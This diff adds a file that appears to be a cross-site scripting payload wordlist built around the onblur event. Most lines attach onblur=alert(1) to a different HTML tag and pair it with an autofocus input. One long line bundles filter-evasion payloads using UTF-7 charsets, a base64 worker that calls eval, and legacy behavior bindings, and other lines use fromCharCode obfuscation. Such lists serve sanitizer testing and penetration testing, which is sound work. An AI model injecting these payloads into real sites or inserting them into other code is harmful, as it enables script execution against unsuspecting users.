@@ -1,0 +1,153 @@
+" onblur=alert(XSvbS) "> <"
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>
+<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>
+<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>
+<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>
+<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>
+<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>
+<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
+<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
+<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
+<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
+<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>
+<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>
+<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>
+<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>
+<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>
+<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+<body onblur=alert(1) id=x><iframe id=x>
+<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>
+<button onblur=alert(1) id=x></button><input autofocus>
+<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>
+<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>
+<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>
+<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>
+<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>
+<col onblur=alert(1) tabindex=1 id=x></col><input autofocus>
+<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>
+<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>
+<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>
+<datalist onblur=alert(1) tabindex=1 id=x></datalist><input autofocus>
+<dd onblur=alert(1) tabindex=1 id=x></dd><input autofocus>
+<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>
+<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>
+<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>
+<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>
+<dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>
+<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div><div id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div><div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div><div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
+<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>
+<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>
+<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>
+<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>
+<em onblur=alert(1) tabindex=1 id=x></em><input autofocus>
+<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>
+<fieldset onblur=alert(1) tabindex=1 id=x></fieldset><input autofocus>
+<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>
+<figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>
+<font onblur=alert(1) tabindex=1 id=x></font><input autofocus>
+<footer onblur=alert(1) tabindex=1 id=x></footer><input autofocus>
+<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>
+<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>
+<frameset onblur=alert(1) tabindex=1 id=x></frameset><input autofocus>
+<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>
+<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>
+<header onblur=alert(1) tabindex=1 id=x></header><input autofocus>
+<hgroup onblur=alert(1) tabindex=1 id=x></hgroup><input autofocus>
+<hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>
+<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove> <body onblur body onblur="javascript:javascript:alert(1)"></body onblur> \x3Cscript>javascript:alert(1)</script>
+<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>
+<iframe onblur=alert(1) id=x><input autofocus>
+<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>
+<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>
+<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
+<input autofocus onblur=alert(1)>
+<input id=XSS onblur=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>
+<input onblur=alert(1) id=x><input autofocus>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+<ins onblur=alert(1) tabindex=1 id=x></ins><input autofocus>
+<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>
+<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>
+<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>
+<label onblur=alert(1) tabindex=1 id=x></label><input autofocus>
+<legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>
+<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>
+<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>
+<listing onblur=alert(1) tabindex=1 id=x></listing><input autofocus>
+<main onblur=alert(1) tabindex=1 id=x></main><input autofocus>
+<map onblur=alert(1) tabindex=1 id=x></map><input autofocus>
+<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>
+<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>
+<menu onblur=alert(1) tabindex=1 id=x></menu><input autofocus>
+<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>
+<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meter onblur=alert(1) tabindex=1 id=x></meter><input autofocus>
+<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>
+<nav onblur=alert(1) tabindex=1 id=x></nav><input autofocus>
+<nextid onblur=alert(1) tabindex=1 id=x></nextid><input autofocus>
+<nobr onblur=alert(1) tabindex=1 id=x></nobr><input autofocus>
+<noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>
+<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>
+<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>
+<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>
+<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>
+<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>
+<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>
+<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>
+<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>
+<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>
+<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>
+<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>
+<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>
+<progress onblur=alert(1) tabindex=1 id=x></progress><input autofocus>
+<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>
+<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>
+<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>
+<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>
+<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>
+<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>
+<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>
+<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>
+<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>
+<select onblur=alert(1) id=x></select><input autofocus>
+<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>
+<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>
+<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>
+<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>
+<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>
+<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>
+<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>
+<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>
+<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>
+<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>
+<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>
+<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>
+<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>
+<table onblur=alert(1) tabindex=1 id=x></table><input autofocus>
+<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>
+<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>
+<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>
+<textarea onblur=alert(1) id=x></textarea><input autofocus>
+<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>
+<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>
+<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>
+<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>
+<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>
+<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>
+<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>
+<tt onblur=alert(1) tabindex=1 id=x></tt><input autofocus>
+<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>
+<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>
+<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>
+<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>
+<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>
+<x contenteditable onblur=alert(1)>lose focus!
+<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>
+<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
+onblur
